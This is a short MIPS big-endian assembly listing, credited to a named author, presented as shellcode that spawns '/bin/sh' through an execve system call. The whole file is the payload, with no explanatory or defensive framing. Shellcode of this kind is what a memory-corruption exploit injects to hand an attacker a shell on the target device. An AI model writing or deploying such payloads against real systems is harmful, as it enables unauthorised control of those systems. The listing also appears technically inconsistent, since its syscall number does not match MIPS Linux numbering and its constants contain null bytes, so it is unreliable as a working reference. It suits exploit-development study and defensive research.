;;;
;;; MIPS big endian sys_execve("/bin/sh") shellcode
;;;
;;; @_hugsy_
;;;
    li $v0, 0x2f62696e
    sw $v0, 0($sp)
    li $v0, 0x2f736800
    sw $v0, 4($sp)
    li $v0, 11
    move $a0, $sp
    addiu $a1, $zero, 0
    addiu $a2, $zero, 0
    syscall
